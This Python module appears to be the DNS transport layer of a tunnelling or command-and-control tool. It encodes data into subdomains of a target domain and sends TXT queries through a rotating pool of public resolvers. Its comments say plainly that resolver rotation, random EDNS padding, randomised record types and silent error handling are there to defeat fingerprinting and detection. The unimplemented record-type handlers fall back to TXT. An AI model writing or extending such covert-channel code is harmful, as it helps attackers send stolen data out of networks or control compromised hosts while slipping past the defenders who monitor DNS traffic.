# lib/transport/dns.py
import dns.resolver
import dns.message
import dns.query
import dns.rdatatype
import random
import threading
import ipaddress
import binascii


# Resolver pool and rotation
_resolver_pool = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9']
_resolver_index = 0
_resolver_lock = threading.Lock()


class RecordType:
    """Enum for supported DNS record types."""
    TXT = 'TXT'
    A = 'A'
    AAAA = 'AAAA'
    MX = 'MX'
    CNAME = 'CNAME'


def _get_next_resolver():
    """Thread-safe round-robin resolver selection."""
    global _resolver_index
    with _resolver_lock:
        resolver = _resolver_pool[_resolver_index % len(_resolver_pool)]
        _resolver_index += 1
        return resolver


def _is_local(target: str) -> bool:
    """Check if target is local."""
    return target.endswith('.local') or 'localhost' in target


def _get_dns_server(target: str) -> str:
    """Get appropriate DNS server based on target."""
    if _is_local(target):
        return '127.0.0.1'
    return _get_next_resolver()


def send_dns_query_multi(data: bytes, target: str, record_type: str = None):
    """
    Send DNS query with dynamic record type selection.
    Currently falls back to TXT for all types (server compatibility).
    
    Args:
        data: Encoded data to send
        target: Target domain
        record_type: Specific record type or None for random selection
    
    Returns:
        Decoded responses based on record type
    """
    # Dynamic record type selection
    if record_type is None:
        record_type = _select_record_type(len(data))
    
    # Route to appropriate handler
    handlers = {
        RecordType.TXT: _send_txt_query,
        RecordType.A: _send_a_query,
        RecordType.AAAA: _send_aaaa_query,
        RecordType.MX: _send_mx_query,
        RecordType.CNAME: _send_cname_query
    }
    
    handler = handlers.get(record_type, _send_txt_query)
    return handler(data, target)


def _select_record_type(data_length: int) -> str:
    """
    Intelligently select record type based on data size and randomness.
    
    Strategy:
    - Large payloads (>100 bytes): Prefer TXT (70%), fallback to others (30%)
    - Medium payloads (20-100 bytes): Mix of all types
    - Small payloads (<20 bytes): Prefer A/AAAA (50%), TXT (30%), others (20%)
    """
    rand = random.random()
    
    if data_length > 100:
        # Large data - prefer TXT
        if rand < 0.7:
            return RecordType.TXT
        else:
            return random.choice([RecordType.MX, RecordType.CNAME])
    
    elif data_length > 20:
        # Medium data - balanced mix
        weights = {
            RecordType.TXT: 0.4,
            RecordType.A: 0.2,
            RecordType.AAAA: 0.15,
            RecordType.MX: 0.15,
            RecordType.CNAME: 0.1
        }
        return random.choices(list(weights.keys()), weights=list(weights.values()))[0]
    
    else:
        # Small data - prefer A/AAAA
        if rand < 0.5:
            return random.choice([RecordType.A, RecordType.AAAA])
        elif rand < 0.8:
            return RecordType.TXT
        else:
            return random.choice([RecordType.MX, RecordType.CNAME])


# TXT Record Handler (existing implementation)
def _send_txt_query(data: bytes, target: str):
    """
    Send TXT query with improved reliability and anti-fingerprinting.
    
    Enhancements:
    - Resolver rotation (defeats single-resolver fingerprinting)
    - Optimized timeout (3s instead of 5s for faster response)
    - Random EDNS padding (30% chance, defeats size fingerprinting)
    - Retry logic with fallback
    - Silent error handling
    """
    subdomain = data.decode('ascii') if isinstance(data, bytes) else data
    query_domain = f"{subdomain}.{target}"
    
    # Determine DNS server based on target
    if _is_local(target):
        dns_server = '127.0.0.1'
        dns_port = 53
        timeout = 5  # Local can be slower
    else:
        # Production: rotate through resolver pool
        dns_server = _get_next_resolver()
        dns_port = 53
        timeout = 3  # Optimized: 3s is sufficient for most networks
    
    # Attempt query with retry
    max_attempts = 2
    for attempt in range(max_attempts):
        try:
            # Create DNS query
            query = dns.message.make_query(query_domain, dns.rdatatype.TXT)
            
            # Add random EDNS padding (defeats size-based fingerprinting)
            # 30% chance to add padding, varies packet size
            if random.random() < 0.3:
                padding_size = random.randint(10, 100)
                # EDNS0 with padding option
                query.use_edns(edns=0, payload=4096, 
                              options=[dns.edns.GenericOption(12, b'\x00' * padding_size)])
            
            # Send query with timeout
            response = dns.query.udp(query, dns_server, port=dns_port, timeout=timeout)
            
            # Extract TXT records
            responses = []
            for answer in response.answer:
                for item in answer:
                    if item.rdtype == dns.rdatatype.TXT:
                        txt_data = b''.join(item.strings).decode('ascii', errors='ignore')
                        responses.append(txt_data)
            
            # Success - return results
            if responses or attempt == max_attempts - 1:
                return responses
                
        except dns.exception.Timeout:
            # Timeout - try next resolver if available
            if attempt < max_attempts - 1 and not _is_local(target):
                dns_server = _get_next_resolver()
                continue
            return []
            
        except Exception:
            # Any other error - fail silently
            if attempt < max_attempts - 1:
                continue
            return []
    
    return []


# A Record Handler - FALLBACK TO TXT (for now)
def _send_a_query(data: bytes, target: str):
    """
    A record query - falls back to TXT until server supports it.
    
    TODO: When server supports A records, implement actual A record logic:
    - Query for A records
    - Parse IPv4 responses
    - Decode 4-byte chunks from IP addresses
    """
    return _send_txt_query(data, target)


# AAAA Record Handler - FALLBACK TO TXT (for now)
def _send_aaaa_query(data: bytes, target: str):
    """
    AAAA record query - falls back to TXT until server supports it.
    
    TODO: When server supports AAAA records, implement actual AAAA record logic:
    - Query for AAAA records
    - Parse IPv6 responses
    - Decode 16-byte chunks from IPv6 addresses
    """
    return _send_txt_query(data, target)


# MX Record Handler - FALLBACK TO TXT (for now)
def _send_mx_query(data: bytes, target: str):
    """
    MX record query - falls back to TXT until server supports it.
    
    TODO: When server supports MX records, implement actual MX record logic:
    - Query for MX records
    - Parse mail exchange responses
    - Decode data from exchange names
    """
    return _send_txt_query(data, target)


# CNAME Record Handler - FALLBACK TO TXT (for now)
def _send_cname_query(data: bytes, target: str):
    """
    CNAME record query - falls back to TXT until server supports it.
    
    TODO: When server supports CNAME records, implement actual CNAME record logic:
    - Query for CNAME records
    - Parse canonical name responses
    - Decode data from CNAME targets
    """
    return _send_txt_query(data, target)


# Backward compatibility - keep existing function
def send_dns_query(data: bytes, target: str):
    """Legacy function - defaults to TXT records."""
    return _send_txt_query(data, target)
